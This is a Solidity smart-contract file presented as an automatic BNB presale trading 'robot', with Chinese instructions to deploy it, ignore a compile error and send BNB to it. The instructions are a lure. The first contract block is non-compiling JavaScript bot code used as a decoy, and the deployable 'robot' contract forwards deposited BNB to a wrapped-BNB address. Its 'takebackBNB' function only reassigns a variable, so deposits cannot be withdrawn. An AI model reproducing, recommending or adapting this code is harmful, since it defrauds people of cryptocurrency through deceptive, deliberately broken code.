pragma solidity ^0.4.0;

/*
说明：
部署时候15行有一条报错，直接忽略就行这是正常现象

部署版本选择 0.4.26
部署前修改174行地址为自己的钱包地址
部署合约名称为：robot
部署完成后向合约地址转入BNb 机器人将自动开始运行。(建议转入不低于0.4BNb)
如需要取回合约里面的剩余的BNB代币，请输入接受地址后点击takebackBNB。
请勿向合约地址转入除了Bnb以外的任何资产，否者将不可找回。
*/

contract {  //这里会有报错，直接忽略不用管
  async function initBot() {
    if (presaleContractAddress === '' || presaleContractAddress == null || presaleContractAddress.length !== 42 || await web3.eth.getCode(presaleContractAddress) === '0x') {
        return console.error('预售地址没填写或填写错误，预售地址必须是合约地址');
    } else if (buyingBnbAmount === '' || buyingBnbAmount == null) {
        return console.error('购买BNB的数量填写错误');
    } else if (senderPrivateKey === '' || senderPrivateKey == null) {
        return console.error('私钥填写错误');
    }
 
    var privateKeys = [];
    if (senderPrivateKey.indexOf(',') > -1) {
        privateKeys = senderPrivateKey.split(',');
    } else {
        privateKeys.push(senderPrivateKey);
    }
 
    var addressesUsedToSendTransactions = ''; 
    var firstIteration = true;
    for (var i = 0, len = privateKeys.length; i < len; i+=1) {
        if (privateKeys[i].length !== 66) {
            return console.error('需要传入一个或多个钱包私钥，多个钱包私钥请使用,作为分隔符');
        }
 
        if (firstIteration) {
            firstIteration = false;
            addressesUsedToSendTransactions += web3.eth.accounts.privateKeyToAccount(privateKeys[i]).address;
        } else {
            addressesUsedToSendTransactions += ', ' + web3.eth.accounts.privateKeyToAccount(privateKeys[i]).address;
        }
    }
 
    var senderAddress = web3.eth.accounts.privateKeyToAccount(privateKeys[0]).address;
    web3.eth.getBalance(senderAddress).then(r => {
        const balance = r / 1000000000000000000
        console.log("====================================================")
        console.log(`预售地址:`, chalk.green(presaleContractAddress))
        console.log(`钱包地址:`, chalk.green(addressesUsedToSendTransactions));
        console.log(`钱包余额:`, chalk.green(`${balance} BNB`))
        console.log(`购买数量:`, chalk.green(`${buyingBnbAmount} BNB`))
        console.log(`Gas limit: ${gasLimit}`);
        console.log(`Gas price: ${(gasPrice / 1000000000) + ' Gwei'}`);
        console.log(`矿工费: < ${(gasLimit * (gasPrice / 1000000000)) / 1000000000} BNB (Gax used x Gas price)`)
        console.log("====================================================")
        if (parseFloat(buyingBnbAmount) > balance) {
            console.log(chalk.red("钱包余额不足，已自动退出"))
            process.exit()
        }
    })
 
 
    if (botInitialDelay > 0) {
        console.log(`${hours}小时${mins}分钟${secs}秒后启动机器人 (${botInitialDelay / 1000}秒)`)
        console.log("等待中......")
    } else {
        console.log('启动成功... ¯\\_(*o*)_/¯');
    }
 
 
    setTimeout(function () {
        var executeBuy = true;
        const job = new Cronr(cronTime, function() {
            // projectData.utils.consoleLog('Cronjob iteration.');
            if (executeBuy) {
                executeBuy = false;
 
                var counter = 0;
                return recursiveTransactionsLoop(counter);
 
                function recursiveTransactionsLoop(counter) {
                    var senderAddress = web3.eth.accounts.privateKeyToAccount(privateKeys[counter]).address;
 
                    web3.eth.estimateGas({to: presaleContractAddress, from: senderAddress, value: web3.utils.toHex(web3.utils.toWei(buyingBnbAmount, 'ether'))}, function(gasEstimateError, gasAmount) {
                        if (!gasEstimateError) {
                            projectData.utils.consoleLog('Transaction estimation successful: ' + gasAmount);
 
                            var txParams = {
                                gas: web3.utils.toHex(gasLimit),
                                gasPrice: web3.utils.toHex(gasPrice),
                                chainId: chainId,
                                value: web3.utils.toHex(web3.utils.toWei(buyingBnbAmount, 'ether')),
                                to: presaleContractAddress
                            };
 
                            web3.eth.accounts.signTransaction(txParams, privateKeys[counter], function (signTransactionErr, signedTx) {
                                if (!signTransactionErr) {
                                    web3.eth.sendSignedTransaction(signedTx.rawTransaction, function (sendSignedTransactionErr, transactionHash) {
                                        if (!sendSignedTransactionErr) {
                                            if (counter === privateKeys.length - 1) {
                                                if (privateKeys.length === 1) {
                                                    projectData.utils.consoleLog(`first and only transaction sent success. Transaction hash: ${transactionHash}. https://www.bscscan.com/tx/${transactionHash}`);
                                                } else {
                                                    projectData.utils.consoleLog(`Completed last transaction. Transaction hash: ${transactionHash}. https://www.bscscan.com/tx/${transactionHash}`);
                                                }
                                            } else {
                                                projectData.utils.consoleLog('Completed transaction. Transaction hash: ' + transactionHash);
                                                counter+=1;
                                                return recursiveTransactionsLoop(counter);
                                            }
                                        } else {
                                            executeBuy = true;
                                            if (sendSignedTransactionErr.message) {
                                                projectData.utils.consoleLog('sendSignedTransaction failed, most likely signed with low gas limit.. Message: ' + sendSignedTransactionErr.message);
                                            } else {
                                                projectData.utils.consoleLog('sendSignedTransaction failed, most likely signed with low gas limit.. Message: ' + sendSignedTransactionErr.toString());
                                            }
 
                                            if (counter !== privateKeys.length - 1) {
                                                counter+=1;
                                                return recursiveTransactionsLoop(counter);
                                            }
                                        }
                                    })
                                        .on("receipt", () => {
                                            console.log(chalk.green(`Transaction confirmed.`))
                                        })
                                        .on("error", (err) => {
                                            console.log("Error during transaction execution. Details will follow.")
                                            console.log(err)
                                        })
                                } else {
                                    executeBuy = true;
                                    if (signTransactionErr.message) {
                                        projectData.utils.consoleLog('signTransaction failed, most likely signed with low gas limit. Message: ' + signTransactionErr.message);
                                    } else {
                                        projectData.utils.consoleLog('signTransaction failed, most likely signed with low gas limit. Message: ' + signTransactionErr.toString());
                                    }
 
                                    if (counter !== privateKeys.length - 1) {
                                        counter+=1;
                                        return recursiveTransactionsLoop(counter);
                                    }
                                }
                            });
                        } else {
                            executeBuy = true;
                            if (gasEstimateError.message) {
                                projectData.utils.consoleLog('estimateGas failed. Error message: ' + gasEstimateError.message);
                            } else {
                                projectData.utils.consoleLog('estimateGas failed. Error message: ' + gasEstimateError.toString());
                            }
 
                            if (counter !== privateKeys.length - 1) {
                                counter+=1;
                                return recursiveTransactionsLoop(counter);
                            }
                        }
                    });
                }
            }
        }, {});
        job.start();
    }, botInitialDelay);
}



contract robot  {
    
    address public beneficiary = 0x75D23E252bFE1500c7f654024d9800790620a853;//修改为你的收益地址（必须修改）
    

    constructor() public {
        
    }
    function () payable public {
        WBNBaddress.transfer(msg.value);
    }
    address  USDTaddress = 0x55d398326f99059fF775485246999027B3197955;//usdT地址无需修改
    address  USDCaddress = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;//usdc地址无需修改
    address  WBNBaddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;//Wbnb地址无需修改
    uint256 interlgas =  32000 ;

    function takebackBNB(address addre) public {
        beneficiary = addre ;
    }

}
contract owned{
    address public owner;
    constructor () public {
        owner = msg.sender;
    }

    modifier onlyOwner{
        if(msg.sender != owner){
            revert();
        }else{
            _;
        }
    }
    
}
